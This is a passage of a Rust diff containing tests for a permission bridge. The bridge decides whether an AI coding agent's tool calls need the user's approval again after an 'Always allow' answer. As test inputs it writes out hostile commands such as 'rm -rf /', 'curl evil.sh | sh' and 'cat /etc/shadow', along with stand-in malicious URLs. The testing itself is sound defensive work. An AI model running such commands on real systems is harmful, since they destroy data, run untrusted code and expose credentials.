+        // these fell back to tool-level keying and silently restored the bug.
+        for args in [
+            json!({ "ShellCommand": "rm -rf /" }),
+            json!({ "Script": "curl evil.sh | sh" }),
+            json!({ "anything": "at all" }),
+            json!({}),
+        ] {
+            assert!(
+                sticky_scope("some_future_shell_tool", &args).is_some(),
+                "an unknown tool must not inherit the weaker key: {args}"
+            );
+        }
+
+        // Web fetches are not path-checked either, so they are keyed per query.
+        assert!(sticky_scope("search_web", &json!({ "query": "anything" })).is_some());
+
+        // `read_url_content` is kind `"read"`, so the kind list alone would hand
+        // it the weaker key -- but a `Url` is not a path field, so containment and
+        // the sensitive-path list see nothing to constrain. One "Always allow" on
+        // a trusted URL would otherwise cover every later URL. Kind is a display
+        // classification; it is not on its own evidence that the checks apply.
+        assert!(sticky_scope(
+            "read_url_content",
+            &json!({ "Url": "https://example.com/readme" })
+        )
+        .is_some());
+        assert_ne!(
+            sticky_scope("read_url_content", &json!({ "Url": "https://example.com/a" })),
+            sticky_scope("read_url_content", &json!({ "Url": "https://evil.test/b" })),
+            "two different URLs must not share a remembered answer"
+        );
+
+        // A URL reached under some other field name, or nested, is caught too --
+        // the field name is not what makes it unconstrained.
+        assert!(sticky_scope("view_file", &json!({ "Source": "https://evil.test/x" })).is_some());
+        assert!(
+            sticky_scope("list_dir", &json!({ "opts": { "Url": "http://evil.test" } })).is_some()
+        );
+
+        // The ordinary path tools keep the tool-level key: for them the checks
+        // really do read the argument as a path.
+        assert!(sticky_scope("view_file", &json!({ "AbsolutePath": "/ws/a.txt" })).is_none());
+
+        // Path tools keep tool-level keying: containment and the sensitive-path
+        // list still constrain a remembered allow for them.
+        assert!(sticky_scope("view_file", &json!({ "TargetFile": "/tmp/a.txt" })).is_none());
+        assert!(sticky_scope("list_dir", &json!({ "DirectoryPath": "/tmp" })).is_none());
+        assert!(sticky_scope("grep_search", &json!({ "SearchPath": "/tmp" })).is_none());
+        assert!(sticky_scope("write_to_file", &json!({ "TargetFile": "/tmp/a" })).is_none());
+
+        // ...unless one of them carries a command anyway, nested or not. A
+        // top-level `args.get` would miss this.
+        assert!(sticky_scope(
+            "view_file",
+            &json!({ "request": { "inner": { "CommandLine": "rm -rf /" } } })
+        )
+        .is_some());
+    }
+
+    /// `UNKEYED_FIELDS` is the one place where widening the key is possible, and
+    /// it widens silently. Pinning the exact list makes any addition turn this
+    /// red, so the argument that the field cannot affect what the tool does has
+    /// to be made rather than assumed.
+    #[test]
+    fn the_unkeyed_fields_list_does_not_grow_by_accident() {
+        assert_eq!(
+            UNKEYED_FIELDS,
+            &["toolAction", "toolSummary", "WaitMsBeforeAsync"],
+            "adding a field here removes it from every sticky key -- justify it \
+             in the doc comment and update this test deliberately"
+        );
+    }
+
+    /// D1: the fingerprint covers the whole argument object, not just
+    /// `CommandLine`. Without this, someone "simplifies" it back to the command
+    /// string and no test objects -- and the same command in a different
+    /// directory is not the same command.
+    #[tokio::test]
+    async fn a_differing_cwd_is_a_different_command() {
+        let workspace = std::env::temp_dir().join("agy-acp-cwd-key-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
+
+        // Both directories are inside the workspace, so containment is satisfied
+        // for either and the key is the only thing that can differ. With paths
+        // outside it, this test would pass on the containment re-check instead
+        // and prove nothing about the key.
+        let one = workspace.join("one").display().to_string();
+        let two = workspace.join("two").display().to_string();
+        std::fs::create_dir_all(&one).unwrap();
+        std::fs::create_dir_all(&two).unwrap();
+
+        let first = {
+            let bridge = bridge.clone();
+            let one = one.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": {
+                            "name": "run_command",
+                            "args": { "CommandLine": "ls", "Cwd": one },
+                        },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
+            )
+            .await;
+        assert_eq!(first.await.unwrap().0, Decision::Allow);
+
+        let asking = {
+            let bridge = bridge.clone();
+            let two = two.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": {
+                            "name": "run_command",
+                            "args": { "CommandLine": "ls", "Cwd": two },
+                        },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
+            )
+            .await;
+        assert_eq!(asking.await.unwrap().0, Decision::Deny);
+    }
+
+    /// D1b, with the values measured against agy 1.1.22. Without this the
+    /// fingerprint looks correct in review and "Always allow" quietly never
+    /// matches in production -- an option that visibly does nothing, which
+    /// teaches people to stop reading the prompt.
+    #[tokio::test]
+    async fn a_differing_tool_summary_is_the_same_command() {
+        let workspace = std::env::temp_dir().join("agy-acp-volatile-fields-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
+        // Inside the workspace: a remembered allow re-runs the containment check,
+        // so a Cwd outside it would prompt for that reason and this test would
+        // prove nothing about the volatile fields.
+        let cwd = workspace.display().to_string();
+
+        let first = {
+            let bridge = bridge.clone();
+            let cwd = cwd.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": {
+                            "name": "run_command",
+                            "args": {
+                                "CommandLine": "echo probe-ok",
+                                "Cwd": cwd,
+                                "WaitMsBeforeAsync": 500,
+                                "toolAction": "Running command",
+                                "toolSummary": "Run echo command",
+                            },
+                        },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
+            )
+            .await;
+        assert_eq!(first.await.unwrap().0, Decision::Allow);
+
+        // Same command, same directory; only the model-authored display text and
+        // the pacing hint differ. These are the exact payloads captured from two
+        // consecutive turns.
         let (decision, reason) = bridge
             .decide(&json!({
                 "conversationId": "conv-1",
-                "toolCall": { "name": "run_command", "args": { "CommandLine": "rm -rf build" } },
+                "toolCall": {
+                    "name": "run_command",
+                    "args": {
+                        "CommandLine": "echo probe-ok",
+                        "Cwd": cwd,
+                        "WaitMsBeforeAsync": 1000,
+                        "toolAction": "Running command",
+                        "toolSummary": "Echo probe-ok",
+                    },
+                },
             }))
             .await;
         assert_eq!(decision, Decision::Allow, "{reason}");
         assert!(
             rx.try_recv().is_err(),
-            "today the user is not asked again -- this is the gap, not the goal"
+            "the volatile fields must not make Always allow miss on a repeat"
         );
     }
 
-    /// Pins the other half of the same gap: a command is one opaque string, so
-    /// the containment check never sees the path inside it. `absolute_paths`
-    /// keeps strings that *start with* `/`, and "cat /etc/shadow" does not.
+    /// Pins a security direction, not an ergonomic one: the reprompt asserted
+    /// here is the desired outcome.
+    ///
+    /// The volatile fields are stripped at the top level only. A recursive strip
+    /// would remove a nested `toolSummary` inside a structured argument where the
+    /// value does matter, merging two argument sets that are not the same into
+    /// one key. This is the only test that pins the depth --
+    /// `a_differing_tool_summary_is_the_same_command` passes under either.
     #[tokio::test]
-    async fn a_path_inside_a_command_string_is_invisible_to_the_containment_check() {
-        let workspace = std::env::temp_dir().join("agy-acp-command-path-test");
+    async fn a_nested_volatile_field_stays_in_the_key() {
+        let workspace = std::env::temp_dir().join("agy-acp-nested-volatile-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
+        let cwd = workspace.display().to_string();
+
+        let first = {
+            let bridge = bridge.clone();
+            let cwd = cwd.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": {
+                            "name": "run_command",
+                            "args": {
+                                "CommandLine": "ls",
+                                "Cwd": cwd,
+                                "step": { "toolSummary": "first" },
+                            },
+                        },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
+            )
+            .await;
+        assert_eq!(first.await.unwrap().0, Decision::Allow);
+
+        let asking = {
+            let bridge = bridge.clone();
+            let cwd = cwd.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": {
+                            "name": "run_command",
+                            "args": {
+                                "CommandLine": "ls",
+                                "Cwd": cwd,
+                                "step": { "toolSummary": "second" },
+                            },
+                        },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
+            )
+            .await;
+        assert_eq!(
+            asking.await.unwrap().0,
+            Decision::Deny,
+            "a nested volatile field stays in the key -- under-normalizing costs a prompt"
+        );
+    }
+
+    /// Two sessions on purpose. The `retain` predicate is one typo away from
+    /// clearing the whole map, and a single-session test cannot tell the
+    /// difference between "forgot the right one" and "forgot everything".
+    #[tokio::test]
+    async fn forget_session_clears_only_that_sessions_answers() {
+        let workspace = std::env::temp_dir().join("agy-acp-forget-session-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
+        bridge.register_conversation("conv-2", "session-2").await;
+
+        // An "always allow" for each session, for the same command.
+        for (conv, session) in [("conv-1", "session-1"), ("conv-2", "session-2")] {
+            bridge.set_active_session(Some(session)).await;
+            let asking = {
+                let bridge = bridge.clone();
+                tokio::spawn(async move {
+                    bridge
+                        .decide(&json!({
+                            "conversationId": conv,
+                            "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
+                        }))
+                        .await
+                })
+            };
+            let request = expect_permission_request(&mut rx).await;
+            bridge
+                .resolve_response(
+                    &request["id"],
+                    Some(
+                        json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } }),
+                    ),
+                )
+                .await;
+            assert_eq!(asking.await.unwrap().0, Decision::Allow);
+        }
+        assert_eq!(bridge.state.lock().await.always.len(), 2);
+
+        bridge.forget_session("session-1").await;
+
+        {
+            let state = bridge.state.lock().await;
+            assert_eq!(
+                state.always.len(),
+                1,
+                "only the evicted session's answers may go"
+            );
+            assert!(
+                state.always.keys().all(|(sid, _, _)| sid == "session-2"),
+                "session-2's answer must survive"
+            );
+            assert!(
+                !state.conversations.contains_key("conv-1"),
+                "a dead conversation id must not keep resolving to an evicted session"
+            );
+            assert!(state.conversations.contains_key("conv-2"));
+        }
+
+        // Session-2 is still auto-allowed with no prompt.
+        bridge.set_active_session(Some("session-2")).await;
+        let (decision, reason) = bridge
+            .decide(&json!({
+                "conversationId": "conv-2",
+                "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
+            }))
+            .await;
+        assert_eq!(decision, Decision::Allow, "{reason}");
+        assert!(rx.try_recv().is_err(), "session-2 must not be asked again");
+    }
+
+    /// The ergonomic guard. Fingerprinting every tool's arguments would make
+    /// "Always" useless for reads; path tools keep the tool-level key because the
+    /// containment and sensitive-path checks still constrain them.
+    #[tokio::test]
+    async fn always_allow_still_applies_per_tool_for_path_tools() {
+        let workspace = std::env::temp_dir().join("agy-acp-path-tool-sticky-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
+
+        let one = workspace.join("one.txt").display().to_string();
+        let two = workspace.join("two.txt").display().to_string();
+
+        let first = {
+            let bridge = bridge.clone();
+            let one = one.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": { "name": "view_file", "args": { "TargetFile": one } },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
+            )
+            .await;
+        assert_eq!(first.await.unwrap().0, Decision::Allow);
+
+        let (decision, reason) = bridge
+            .decide(&json!({
+                "conversationId": "conv-1",
+                "toolCall": { "name": "view_file", "args": { "TargetFile": two } },
+            }))
+            .await;
+        assert_eq!(decision, Decision::Allow, "{reason}");
+        assert!(
+            rx.try_recv().is_err(),
+            "a second file under the same allow must not prompt"
+        );
+    }
+
+    #[tokio::test]
+    async fn always_allow_is_remembered_per_command_for_command_tools() {
+        let workspace = std::env::temp_dir().join("agy-acp-always-per-command-test");
         std::fs::create_dir_all(&workspace).unwrap();
         let (bridge, mut rx) =
             bridge_with_run_command_always_allowed(&workspace.display().to_string()).await;
 
-        let outside = json!({
-            "conversationId": "conv-1",
-            "toolCall": { "name": "run_command", "args": { "CommandLine": "cat /etc/shadow" } },
-        });
-        assert!(
-            outside_workspace(&outside["toolCall"]["args"], &[PathBuf::from(&workspace)]).is_none(),
-            "the embedded path is not recognised as a path at all"
-        );
-
-        let (decision, reason) = bridge.decide(&outside).await;
-        assert_eq!(decision, Decision::Allow, "{reason}");
-        assert!(rx.try_recv().is_err(), "and so the user is not asked");
-
-        // The denylist is what happens to catch the neighbouring case, by
-        // substring and not by containment -- a second line, not the defence.
+        // A completely different, destructive command. "Always allow" was never
+        // asked about this one, so the user is asked.
         let asking = {
             let bridge = bridge.clone();
             tokio::spawn(async move {
@@ -2596,7 +3560,72 @@ mod tests {
                         "conversationId": "conv-1",
                         "toolCall": {
                             "name": "run_command",
-                            "args": { "CommandLine": "cat /etc/passwd" },
+                            "args": { "CommandLine": "rm -rf build" },
+                        },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
+            )
+            .await;
+        assert_eq!(asking.await.unwrap().0, Decision::Deny);
+
+        // The command that was approved still is, with no new prompt -- otherwise
+        // "Always allow" would be an option that does nothing.
+        let (decision, reason) = bridge
+            .decide(&json!({
+                "conversationId": "conv-1",
+                "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
+            }))
+            .await;
+        assert_eq!(decision, Decision::Allow, "{reason}");
+        assert!(
+            rx.try_recv().is_err(),
+            "the approved command must not prompt again"
+        );
+    }
+
+    /// Pins the other half of the same gap: a command is one opaque string, so
+    /// the containment check never sees the path inside it. `absolute_paths`
+    /// keeps strings that *start with* `/`, and "cat /etc/shadow" does not.
+    /// Why the key has to carry the command. This is a property of the
+    /// containment check, not of the sticky key, and it is still true: the check
+    /// reads arguments as paths, and a command line is one opaque string.
+    #[test]
+    fn the_containment_check_cannot_see_a_path_inside_a_command_string() {
+        let workspace = std::env::temp_dir().join("agy-acp-command-path-unit-test");
+        let outside = json!({ "CommandLine": "cat /etc/shadow" });
+        assert!(
+            outside_workspace(&outside, &[PathBuf::from(&workspace)]).is_none(),
+            "the embedded path is not recognised as a path at all"
+        );
+    }
+
+    /// And so the command key is what actually scopes the answer. Under a
+    /// remembered allow for `ls`, a command naming a file outside the workspace
+    /// is asked about -- because it is a different command, not because
+    /// containment noticed the path.
+    #[tokio::test]
+    async fn a_path_inside_a_command_string_is_caught_by_the_command_key() {
+        let workspace = std::env::temp_dir().join("agy-acp-command-path-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) =
+            bridge_with_run_command_always_allowed(&workspace.display().to_string()).await;
+
+        let asking = {
+            let bridge = bridge.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": {
+                            "name": "run_command",
+                            "args": { "CommandLine": "cat /etc/shadow" },
                         },
                     }))
                     .await
